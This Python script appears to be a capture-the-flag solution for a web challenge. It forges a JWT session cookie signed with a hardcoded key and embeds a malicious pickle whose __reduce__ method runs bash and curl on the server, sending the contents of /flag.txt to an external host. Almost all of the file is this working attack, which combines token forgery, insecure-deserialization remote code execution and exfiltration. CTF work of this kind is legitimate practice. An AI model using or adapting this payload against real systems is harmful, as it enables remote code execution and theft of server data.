import jwt  # pyjwt
import base64
import pickle
import pickletools
# import sqlalchemy
# import pkl_app.models
import requests

def decode_jwt(jwt_data, jwt_key='SecreT'):
    return jwt.decode(jwt_data, jwt_key, algorithms=['HS256'])

def encode_jwt(jwt_data, jwt_key='SecreT'):
    return jwt.encode(jwt_data, jwt_key, algorithm='HS256')

class RCE:
    def __reduce__(self):
        # code = open('rce.py', 'r').read()
        cmd = ['bash', '-c', 'curl "https://ctfforsite.pythonanywhere.com/`cat /flag.txt`"']
        return __import__('subprocess').check_output, (cmd,)


# payload = b'\x80\x04\x95O\x01\x00\x00\x00\x00\x00\x00\x8c\x0epkl_app.models\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x12_sa_instance_state\x94\x8c\x14sqlalchemy.orm.state\x94\x8c\rInstanceState\x94\x93\x94)\x81\x94}\x94(\x8c\x08instance\x94h\x03\x8c\x0fcommitted_state\x94}\x94\x8c\x03key\x94h\x02K^\x85\x94N\x87\x94\x8c\x0cload_options\x94\x8f\x94\x8c\x06class_\x94h\x02\x8c\x12expired_attributes\x94\x8f\x94\x8c\tload_path\x94]\x94h\x02N\x86\x94a\x8c\x07manager\x94\x8c\x1esqlalchemy.orm.instrumentation\x94\x8c\x11_SerializeManager\x94\x93\x94)\x81\x94}\x94h\x13h\x02sbub\x8c\x08password\x94\x8c\x01q\x94\x8c\x08username\x94h \x8c\x02id\x94K^ub.'
# res = pickle.loads(payload)
# res.id = 1
# res.username = 'admin'
# res.password = 'qwe'
payload = pickle.dumps(RCE())
# pickletools.dis(payload)
# try:
#     pickle.loads(payload)
# except Exception as e:
#     print(e)
# exit()
cookie = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE3NTA3MDUsIm5iZiI6MTYwMTc1MDcwNSwianRpIjoiMWUxN2I3OTUtOGNhZi00N2U1LWJhZTEtOWE4MjVjMDdiOWMyIiwiZXhwIjoxNjMzMjg2NzA1LCJpZGVudGl0eSI6ImdBU1ZZQUFBQUFBQUFBQ01DR0oxYVd4MGFXNXpsSXdFWlhobFk1U1RsSXhFWDE5cGJYQnZjblJmWHlnaWNtVnhkV1Z6ZEhNaUtTNW5aWFFvSW1oMGRIQnpPaTh2WTNSbVptOXljMmwwWlM1d2VYUm9iMjVoYm5sM2FHVnlaUzVqYjIwdklpbVVoWlJTbEM0PSIsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.nBqcy_uP67CuF_jswrWshjVJnenct6owgv2Mmc-ALaM'
data = decode_jwt(cookie)
data['identity'] = base64.b64encode(payload).decode()
cookie = encode_jwt(data).decode()
# print(cookie.decode())
cookies = {
    'access_token_cookie': cookie
}
resp = requests.get('http://dead-journal.mctf.online/', cookies=cookies)
print(resp.text)
